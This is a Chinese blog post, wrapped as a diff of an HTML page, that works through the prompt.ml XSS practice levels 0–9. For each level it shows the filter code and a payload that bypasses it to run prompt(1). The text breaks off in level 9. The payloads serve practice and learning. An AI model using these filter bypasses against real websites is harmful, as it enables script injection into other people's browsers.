@@ -1,0 +1,639 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>XSS靶场练习（一） - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="XSS靶场练习（一）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-06-04 15:55" pubdate>
+        2019年6月4日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      42
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XSS靶场练习（一）</h1>
+            
+            <div class="markdown-body">
+              <p>一直对XSS了解的不够深，找了一个<a target="_blank" rel="noopener" href="http://prompt.ml/">平台</a>来练习下，目的是执行<code>prompt(1)</code></p>
+<a id="more"></a>
+
+<h3 id="第0关"><a href="#第0关" class="headerlink" title="第0关"></a>第0关</h3><p>没有任何过滤，直接闭合标签即可<br>Payload:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190529211042.png" srcset="/img/loading.gif"></p>
+<h3 id="第1关"><a href="#第1关" class="headerlink" title="第1关"></a>第1关</h3><p>源码</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">escape</span>(<span class="hljs-keyword">input</span>) &#123;<br>    // tags stripping mechanism <span class="hljs-keyword">from</span> ExtJS library<br>    // Ext.util.<span class="hljs-keyword">Format</span>.stripTags<br>    var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;<br>    input = <span class="hljs-keyword">input</span>.replace(stripTagsRE, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;article&gt;&#x27;</span> + <span class="hljs-keyword">input</span> + <span class="hljs-string">&#x27;&lt;/article&gt;&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure>
+<p>可以看到加了一个正则，来过滤了形如<code>&lt;xxx&gt;</code>的内容，可以使用注释符号<code>//</code>来绕过，借助<code>onload</code>事件来执行代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;body onload=prompt(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190529211450.png" srcset="/img/loading.gif"></p>
+<h3 id="第2关"><a href="#第2关" class="headerlink" title="第2关"></a>第2关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">//                      v-- frowny face</span><br>    input = input.replace(<span class="hljs-regexp">/[=(]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-comment">// ok seriously, disallows equal signs and open parenthesis</span><br>    <span class="hljs-keyword">return</span> input;<br>&#125; <br></code></pre></td></tr></table></figure>
+<p>根据正则，可以判断过滤了<code>(</code>和<code>=</code>两个字符，可以使用编码绕过，但是我直接使用</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>不能成功，在前面加了一个<code>svg</code>标签就可以了。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;svg&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#111;</span><span class="hljs-symbol">&amp;#109;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>找到了一个解释</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://pupiles.com/xss.html">http://pupiles.com/xss.html</a></p>
+</blockquote>
+<p>后面仔细研究下<code>HTML</code>的解析流程。</p>
+<p><img src="https://image.mengsec.com/xss-prompt/20190529220030.png" srcset="/img/loading.gif"></p>
+<h3 id="第3关"><a href="#第3关" class="headerlink" title="第3关"></a>第3关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// filter potential comment end delimiters</span><br>    input = input.replace(<span class="hljs-regexp">/-&gt;/g</span>, <span class="hljs-string">&#x27;_&#x27;</span>);<br><br>    <span class="hljs-comment">// comment the input to avoid script execution</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;!-- &#x27;</span> + input + <span class="hljs-string">&#x27; --&gt;&#x27;</span>;<br>&#125;        <br></code></pre></td></tr></table></figure>
+<p>使用正则将<code>-&gt;</code>替换为<code>_</code><br>在这里用到了<code>HTML5</code>中的一个<code>trick</code>，可以使用<code>--!&gt;</code>来闭合注释<br>Payload:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">--!&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>prompt(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190529221640.png" srcset="/img/loading.gif"></p>
+<h3 id="第4关"><a href="#第4关" class="headerlink" title="第4关"></a>第4关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// make sure the script belongs to own site</span><br>    <span class="hljs-comment">// sample script: http://prompt.ml/js/test.js</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="hljs-built_in">decodeURIComponent</span>(input))) &#123;<br>        <span class="hljs-keyword">var</span> script = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;script&#x27;</span>);<br>        script.src = input;<br>        <span class="hljs-keyword">return</span> script.outerHTML;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid resource.&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这个折腾了好久没做出来，看了下<code>Writeup</code>，利用URL的组成来绕过正则的检测，不过已经在最新版Chrome和Firefox上失效了。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://prompt.ml%<span class="hljs-number">2</span>f@test.mengsec.com/<span class="hljs-number">1</span>.js<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190530173025.png" srcset="/img/loading.gif"></p>
+<h3 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// apply strict filter rules of level 0</span><br>    <span class="hljs-comment">// filter &quot;&gt;&quot; and event handlers</span><br>    input = input.replace(<span class="hljs-regexp">/&gt;|on.+?=|focus/gi</span>, <span class="hljs-string">&#x27;_&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input value=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot; type=&quot;text&quot;&gt;&#x27;</span>;<br>&#125;    <br></code></pre></td></tr></table></figure>
+<p>正则匹配<code>&gt;</code>、<code>onxxx=</code>或者<code>focus</code>之类的字符，修饰符<code>i</code>匹配大小写，修饰符<code>g</code>全局匹配。<br>在<code>HTML</code>中，换行符等空白字符不会影响<code>HTML</code>解析。<br>又因为浏览器默认解析第一个<code>type</code>，因此可以使用构造<code>payload</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;type=&quot;</span>image<span class="hljs-string">&quot;  src=233  onerror </span><br><span class="hljs-string">=&quot;</span>prompt(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190530174644.png" srcset="/img/loading.gif"></p>
+<h3 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// let&#x27;s do a post redirection</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// pass in formURL#formDataJSON</span><br>        <span class="hljs-comment">// e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br>        <span class="hljs-keyword">var</span> segments = input.split(<span class="hljs-string">&#x27;#&#x27;</span>);<br>        <span class="hljs-keyword">var</span> formURL = segments[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">var</span> formData = <span class="hljs-built_in">JSON</span>.parse(segments[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-keyword">var</span> form = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;form&#x27;</span>);<br>        form.action = formURL;<br>        form.method = <span class="hljs-string">&#x27;post&#x27;</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> formData) &#123;<br>            <span class="hljs-keyword">var</span> input = form.appendChild(<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;input&#x27;</span>));<br>            input.name = i;<br>            input.setAttribute(<span class="hljs-string">&#x27;value&#x27;</span>, formData[i]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> form.outerHTML + <span class="hljs-string">&#x27;                         \n\</span><br><span class="hljs-string">&lt;script&gt;                                                  \n\</span><br><span class="hljs-string">    // forbid javascript: or vbscript: and data: stuff    \n\</span><br><span class="hljs-string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span><br><span class="hljs-string">        document.forms[0].submit();                       \n\</span><br><span class="hljs-string">    else                                                  \n\</span><br><span class="hljs-string">        document.write(&quot;Action forbidden.&quot;)               \n\</span><br><span class="hljs-string">&lt;/script&gt;                                                 \n\</span><br><span class="hljs-string">        &#x27;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid form data.&#x27;</span>;<br>    &#125;<br>&#125;   <br></code></pre></td></tr></table></figure>
+<p>整个代码就是根据输入来构造一个表单，源码中给了一个例子<code>http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</code>，输入之后，生成的代码为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;form action=<span class="hljs-string">&quot;http://httpbin.org/post&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Matt&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>                         <br>&lt;script&gt;                                                  <br>    <span class="hljs-comment">// forbid javascript: or vbscript: and data: stuff    </span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/script:|data:/i</span>.test(<span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].action)) <br>        <span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].submit();                       <br>    <span class="hljs-keyword">else</span>                                                  <br>        <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;Action forbidden.&quot;</span>)               <br>&lt;/script&gt;      <br></code></pre></td></tr></table></figure>
+<p>可以认为，在这个表单中，<code>action</code>、<code>name</code>、<code>value</code>可控。<br>在这里用到了一个小<code>trick</code>，先上代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;form action=<span class="hljs-string">&quot;javascript:prompt(1)&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;123&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;233&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>         <br>&lt;script&gt;                                                  <br>    alert(<span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].action);        <br>&lt;/script&gt; <br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190530201130.png" srcset="/img/loading.gif"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;form action=<span class="hljs-string">&quot;javascript:prompt(1)&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;233&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>                         <br>&lt;script&gt;                                                  <br>    <span class="hljs-comment">// forbid javascript: or vbscript: and data: stuff    </span><br>    alert(<span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].action);        <br>&lt;/script&gt;  <br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190530201356.png" srcset="/img/loading.gif"><br>从上面两段代码中，我们可以知道，<code>action</code>会优先指向<code>name</code>为<code>action</code>的子<code>tag</code>。<br>因此可以构造<code>Payload</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;233&quot;&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190530204531.png" srcset="/img/loading.gif"></p>
+<h3 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// pass in something like dog#cat#bird#mouse...</span><br>    <span class="hljs-keyword">var</span> segments = input.split(<span class="hljs-string">&#x27;#&#x27;</span>);<br>    <span class="hljs-keyword">return</span> segments.map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">title</span>) </span>&#123;<br>        <span class="hljs-comment">// title can only contsain 12 characters</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;p class=&quot;comment&quot; title=&quot;&#x27;</span> + title.slice(<span class="hljs-number">0</span>, <span class="hljs-number">12</span>) + <span class="hljs-string">&#x27;&quot;&gt;&lt;/p&gt;&#x27;</span>;<br>    &#125;).join(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>&#125;        <br></code></pre></td></tr></table></figure>
+<p>代码中使用<code>title.slice(0, 12)</code>限定了<code>title</code>长度为<code>12</code>。但是在前面又使用了<code>#</code>作为分割符，可以通过<code>JavaScript</code>的多行注释符来绕过。</p>
+<p>Payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&quot;&gt;&lt;script&gt;/*#*/prompt(/*#*/1)/*#*/&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/xss-prompt/20190530205545.png" srcset="/img/loading.gif"></p>
+<h3 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// prevent input from getting out of comment</span><br>    <span class="hljs-comment">// strip off line-breaks and stuff</span><br>    input = input.replace(<span class="hljs-regexp">/[\r\n&lt;/&quot;]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;                                \n\</span><br><span class="hljs-string">&lt;script&gt;                                    \n\</span><br><span class="hljs-string">    // console.log(&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;);        \n\</span><br><span class="hljs-string">&lt;/script&gt; &#x27;</span>;<br>&#125;        <br></code></pre></td></tr></table></figure>
+<p>想要执行代码，需要换行来跳出注释符的范围，从正则中可以看到，代码过滤了<code>\r</code>和<code>\n</code>两种换行符，还过滤了<code>&lt; </code>、<code>/</code>、 <code>&quot;</code></p>
+<p>在这里使用了<code>unicode</code>编码的注释符来绕过。</p>
+<p><code>Javascript</code>中的特殊字符。</p>
+<table>
+<thead>
+<tr>
+<th>Unicode 字符值</th>
+<th>转义序列</th>
+<th>含义</th>
+<th>类别</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>\u0008</td>
+<td>\b</td>
+<td>Backspace</td>
+<td></td>
+</tr>
+<tr>
+<td>\u0009</td>
+<td>\t</td>
+<td>Tab</td>
+<td>空白</td>
+</tr>
+<tr>
+<td>\u000A</td>
+<td>\n</td>
+<td>换行符（换行）</td>
+<td>行结束符</td>
+</tr>
+<tr>
+<td>\u000B</td>
+<td>\v</td>
+<td>垂直制表符</td>
+<td>空白</td>
+</tr>
+<tr>
+<td>\u000C</td>
+<td>\f</td>
+<td>换页</td>
+<td>空白</td>
+</tr>
+<tr>
+<td>\u000D</td>
+<td>\r</td>
+<td>回车</td>
+<td>行结束符</td>
+</tr>
+<tr>
+<td>\u0022</td>
+<td>&quot;</td>
+<td>双引号 (“)</td>
+<td></td>
+</tr>
+<tr>
+<td>\u0027</td>
+<td>&#39;</td>
+<td>单引号 (‘)</td>
+<td></td>
+</tr>
+<tr>
+<td>\u005C</td>
+<td>\</td>
+<td>反斜杠 ()</td>
+<td></td>
+</tr>
+<tr>
+<td>\u00A0</td>
+<td></td>
+<td>不间断空格</td>
+<td>空白</td>
+</tr>
+<tr>
+<td>\u2028</td>
+<td></td>
+<td>行分隔符</td>
+<td>行结束符</td>
+</tr>
+<tr>
+<td>\u2029</td>
+<td></td>
+<td>段落分隔符</td>
+<td>行结束符</td>
+</tr>
+<tr>
+<td>\uFEFF</td>
+<td></td>
+<td>字节顺序标记</td>
+<td>空白</td>
+</tr>
+</tbody></table>
+<p>构造<code>payload</code></p>
+<p>网上wp上说是可以使用<code>\u2028</code>或者<code>\u2029</code>来绕过上述限制，不过没复现成功。</p>
+<h3 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h3><p>源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params">input</span>) </span>&#123;<br>    <span class="hljs-comment">// filter potential start-tags</span><br>    input = input.replace(<span class="hljs-regexp">/&lt;([a-zA-Z])/g</span>, <span class="hljs-string">&#x27;&lt;_$1&#x27;</span>);<br>    <span class="hljs-comment">// use all-caps for heading</span><br>    input = input.toUpperCase();<br><br>    <span class="hljs-comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/h1&gt;&#x27;</span>;<br>&#125;        <br></code></pre></td></tr></table></figure>
+<p>可以看到，代码将输入的字符进行了一个<code>toUpperCase()</code>操作，在这里用到了一个小<code>trick</code>。</p>
+<p><img src="https://image.mengsec.com/xss-prompt/20190603151625.png" srcset="/img/loading.gif"><br>这涉及到了<code>JavaScript</code>的一个特性</p>
